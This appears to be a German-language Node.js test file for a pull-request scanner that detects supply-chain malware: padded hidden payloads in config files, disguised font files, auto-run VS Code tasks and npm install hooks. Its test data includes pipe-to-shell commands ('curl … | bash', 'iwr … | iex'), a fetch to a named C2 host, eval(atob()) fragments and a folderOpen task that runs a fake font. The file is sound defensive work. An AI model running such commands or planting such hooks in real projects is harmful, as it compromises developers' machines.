import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { pruefeDateien } from '../lib/regeln/index.mjs';
import { pruefeAnhang, GLOBAL_TAG } from '../lib/regeln/anhang.mjs';
import { pruefeMarker } from '../lib/regeln/marker.mjs';
import { pruefeTarnung, passtMagic, pruefeBase64 } from '../lib/regeln/tarnung.mjs';
import { pruefeAutostart } from '../lib/regeln/autostart.mjs';
import { pruefeProjekt } from '../lib/regeln/projekt.mjs';
import { parsePatch } from '../lib/diff.mjs';
import { pseudoBlob, fuellung, datei } from './hilfen.mjs';

const added = (d) => parsePatch(d.patch).added;
const regeln = (liste) => liste.map((b) => b.regel).sort();

test('Anhang: Code hinter 507 Leerzeichen am Ende der letzten echten Zeile → block (Variante-1-Form)', () => {
  const d = datei('apps/web/postcss.config.mjs', ['export default config;' + fuellung(507) + "global['x']='8-1';" + pseudoBlob(5200)]);
  const b = pruefeAnhang(d, added(d));
  assert.equal(b.length, 1);
  assert.equal(b[0].regel, 'anhang/fuellung');
  assert.equal(b[0].stufe, 'block');
  assert.ok(b[0].auszug.length <= 160 && !b[0].auszug.includes('     '));
});

test('Anhang: neue Zeile mit 506 führenden Leerzeichen (Variante-3-Form) → block', () => {
  const d = datei('init', ['x']); // Endung-los: keine Code-Datei → nichts
  assert.equal(pruefeAnhang(d, added(d)).length, 0);
  const d2 = datei('src/setup.js', [fuellung(506) + "global.i = 'A10-*1_3191';" + pseudoBlob(21000) + 'eval(atob(x))']);
  const b = pruefeAnhang(d2, added(d2));
  assert.equal(b[0].regel, 'anhang/fuellung');
  assert.equal(b[0].stufe, 'block');
});

test('Anhang: Riesenzeile ohne Füllung → block in Konfig, warn in normaler Quelldatei, nichts in dist/min', () => {
  const zeile = pseudoBlob(8000) + 'Function(';
  assert.equal(pruefeAnhang(datei('eslint.config.mjs', [zeile]), added(datei('eslint.config.mjs', [zeile])))[0].stufe, 'block');
  assert.equal(pruefeAnhang(datei('src/util.js', [zeile]), added(datei('src/util.js', [zeile])))[0].stufe, 'warn');
  assert.equal(pruefeAnhang(datei('dist/app.js', [zeile]), added(datei('dist/app.js', [zeile]))).length, 0);
  assert.equal(pruefeAnhang(datei('vendor/lib.min.js', [zeile]), added(datei('vendor/lib.min.js', [zeile]))).length, 0);
});

test('Anhang: global-Tag-Regex trifft alle drei bekannten Schreibweisen und nicht normale Zuweisungen', () => {
  for (const s of ["global['!']='8-270-2'", "global.o='5-3-235-du'", 'global["_V"]="8-st12"', "global.i = 'A10-*1_3191'"]) assert.ok(GLOBAL_TAG.test(s), s);
  for (const s of ['global.fetch = fetch', "globalThis.foo = 'bar'", "const global = 'x'", "global.config = { a: 1 }"]) assert.ok(!GLOBAL_TAG.test(s), s);
  const d = datei('test/setup.js', ["global.o='5-3-235-du';"]);
  assert.equal(pruefeAnhang(d, added(d))[0].stufe, 'warn');
  const dk = datei('vite.config.ts', ["global['r']=require;global['m']=module;"]);
  assert.equal(pruefeAnhang(dk, added(dk))[0].stufe, 'block');
});

test('Anhang: legitime Konfigs, Einrückung, Tabellen und lange Strings ohne Code-Token lösen nichts aus', async () => {
  for (const f of ['legit-postcss.config.mjs.txt', 'legit-next.config.mjs.txt']) {
    const zeilen = (await readFile(new URL(`./fixtures/${f}`, import.meta.url), 'utf8')).split('\n');
    const d = datei(f.replace('legit-', '').replace('.txt', ''), zeilen);
    assert.deepEqual(pruefeAnhang(d, added(d)), [], f);
  }
  const tief = datei('src/a.js', [fuellung(48) + 'return value.split(",").join(";"); // tief eingerückt']);
  assert.deepEqual(pruefeAnhang(tief, added(tief)), []);
  const tabelle = datei('src/t.js', ['const x = 1;' + fuellung(150) + '// Kommentar rechts außen']);
  assert.deepEqual(pruefeAnhang(tabelle, added(tabelle)), [], 'Kommentar ohne Code-Token');
  const lang = datei('src/data.js', ['export const lorem = "' + 'lorem ipsum dolor sit amet '.repeat(100) + '";']);
  assert.deepEqual(pruefeAnhang(lang, added(lang)), [], 'lange, aber niedrige Entropie ohne Token');
});

test('Marker: jede Variante, Seeds nur im Kontext, Dateinamen, Propagationsskript-Variante', () => {
  const faelle = [
    ["const s = ('rmcej%otb%', 2857687);", ['marker/polinrider-v1', 'marker/polinrider-v1-seed']],
    ['var MDy = "Cot%3t=shtP";', ['marker/polinrider-v2']],
    ["global.i='A9-3443-2';", ['marker/polinrider-v3-tag']],
    ['const port = 2857687; // zufällig gleiche Zahl', []],
    ['fetch("https://default-configuration.vercel.app/x")', ['marker/polinrider-c2-host']],
    ['for /f "delims=" %%A in (\'cmd /c "git log -1"\') do set LAST_COMMIT_TEXT=%%A', ['marker/polinrider-propagation']],
  ];
  for (const [zeile, erwartet] of faelle) {
    const d = datei('x.js', [zeile]);
    assert.deepEqual(regeln(pruefeMarker(d, added(d))), erwartet.sort(), zeile);
  }
  const bat = datei('temp_auto_push.bat', ['echo hi'], { status: 'added' });
  assert.deepEqual(regeln(pruefeMarker(bat, added(bat))), ['marker/polinrider-bat']);
});

test('Tarnung: echte Magic-Bytes passen, JavaScript in .woff2 fliegt auf', () => {
  const woff2 = Buffer.from('774f46320001000000015ff000130000', 'hex');
  const webp = Buffer.from('52494646d68300005745425056503858', 'hex');
  const png = Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex');
  const jpg = Buffer.from('ffd8ffe000104a464946000101000048', 'hex');
  assert.equal(passtMagic('woff2', woff2), true);
  assert.equal(passtMagic('webp', webp), true);
  assert.equal(passtMagic('png', png), true);
  assert.equal(passtMagic('jpg', jpg), true);
  assert.equal(passtMagic('svg', png), null);
  const falsch = pruefeTarnung({ filename: 'public/fonts/fa-solid-400.woff2' }, Buffer.from("global['r']=require;var _x=function(){" + pseudoBlob(300)));
  assert.equal(falsch.length, 1);
  assert.equal(falsch[0].stufe, 'block');
  assert.match(falsch[0].warum, /JavaScript/);
  assert.deepEqual(pruefeTarnung({ filename: 'a.woff2' }, woff2), []);
  assert.deepEqual(pruefeTarnung({ filename: 'a.woff2' }, null), []);
});

test('Tarnung: Base64-Block warnt, Data-URL-Bild nicht', () => {
  const blob = 'QUJD'.repeat(600);
  const d = datei('src/loader.js', ['const p = "' + blob + '";']);
  assert.equal(pruefeBase64(d, added(d))[0]?.stufe, 'warn');
  const bild = datei('src/icon.js', ['const p = "data:image/png;base64,' + blob + '";']);
  assert.deepEqual(pruefeBase64(bild, added(bild)), []);
  const css = datei('styles.css', ['src: url(' + blob + ')']);
  assert.deepEqual(pruefeBase64(css, added(css)), []);
});

test('Autostart: VS-Code-Task beim Ordner-Öffnen, npm-Lifecycle, pipe-to-shell', () => {
  const task = datei('.vscode/tasks.json', ['{ "tasks": [{ "label": "x", "type": "shell", "command": "node public/fonts/fa-solid-400.woff2", "runOptions": { "runOn": "folderOpen" } }] }']);
  assert.equal(pruefeAutostart(task, added(task))[0].stufe, 'block');
  const pkg = datei('package.json', ['  "postinstall": "node ./scripts/setup.js",']);
  assert.equal(pruefeAutostart(pkg, added(pkg))[0].stufe, 'warn');
  const pkg2 = datei('package.json', ['  "preinstall": "curl -s https://x.example/i.sh | bash",']);
  assert.equal(pruefeAutostart(pkg2, added(pkg2))[0].stufe, 'block');
  const doku = datei('README.md', ['curl -fsSL https://get.example.com | sh']);
  assert.equal(pruefeAutostart(doku, added(doku))[0].stufe, 'info');
  const ps = datei('setup.ps1', ['iwr https://x.example/a.ps1 | iex'], { status: 'added' });
  assert.equal(pruefeAutostart(ps, added(ps))[0].stufe, 'warn');
  const harmlos = datei('src/a.js', ['const x = "install";']);
  assert.deepEqual(pruefeAutostart(harmlos, added(harmlos)), []);
});

test('Projekt: pwn-request, Workflow aus Fork, gitignore-Versteck, neues Skript im Root', () => {
  const wf = datei('.github/workflows/ci.yml', ['on: pull_request_target', '  - uses: actions/checkout@v4', '    with:', '      ref: ${{ github.event.pull_request.head.sha }}']);
  assert.equal(pruefeProjekt(wf, added(wf))[0].stufe, 'block');
  const wf2 = datei('.github/workflows/ci.yml', ['on: push']);
  assert.equal(pruefeProjekt(wf2, added(wf2), { ausFork: true })[0].regel, 'projekt/workflow-aus-fork');
  assert.deepEqual(pruefeProjekt(wf2, added(wf2), { ausFork: false }), []);
  const gi = datei('.gitignore', ['node_modules', 'config.bat']);
  assert.equal(pruefeProjekt(gi, added(gi))[0].regel, 'projekt/gitignore-versteck');
  const sk = datei('run.bat', ['@echo off'], { status: 'added' });
  assert.equal(pruefeProjekt(sk, added(sk))[0].regel, 'projekt/neues-skript-im-root');
  const skTief = datei('scripts/run.sh', ['#!/bin/sh'], { status: 'added' });
  assert.deepEqual(pruefeProjekt(skTief, added(skTief)), []);
});

test('pruefeDateien: dedupliziert je Datei und Regel, überspringt gelöschte, meldet fehlende Diffs und 3000er-Limit', async () => {
  const zeile = 'export default x;' + fuellung(600) + pseudoBlob(3000) + 'fromCharCode(';
  const d = datei('postcss.config.mjs', [zeile, zeile, zeile]);
  const weg = datei('old.config.js', [zeile], { status: 'removed' });
  const binaerOhnePatch = { filename: 'src/big.ts', status: 'modified', additions: 5000, deletions: 0, sha: 'x' };
  const r = await pruefeDateien([d, weg, binaerOhnePatch]);
  assert.equal(r.befunde.filter((b) => b.regel === 'anhang/fuellung').length, 1);
  assert.ok(!r.befunde.some((b) => b.datei === 'old.config.js'));
  assert.ok(r.hinweise.some((h) => /big\.ts.*kein Diff/.test(h)));
  const viele = Array.from({ length: 3000 }, (_, i) => datei(`f${i}.txt`, ['x']));
  assert.ok((await pruefeDateien(viele)).hinweise.some((h) => /3000/.test(h)));
});

test('pruefeDateien: lädt Bytes nur für Binär-Endungen, fängt Ladefehler ab', async () => {
  const geladen = [];
  const ladeBytes = async (f) => { geladen.push(f.filename); if (f.filename.endsWith('.png')) throw new Error('kaputt'); return Buffer.from('774f4632', 'hex'); };
  const r = await pruefeDateien([
    { filename: 'a.woff2', status: 'added', additions: 0, deletions: 0, sha: '1' },
    { filename: 'b.png', status: 'added', additions: 0, deletions: 0, sha: '2' },
    datei('c.js', ['const a = 1;']),
  ], { ladeBytes });
  assert.deepEqual(geladen, ['a.woff2', 'b.png']);
  assert.deepEqual(r.befunde, []);
  assert.ok(r.hinweise.some((h) => /b\.png.*kaputt/.test(h)));
});
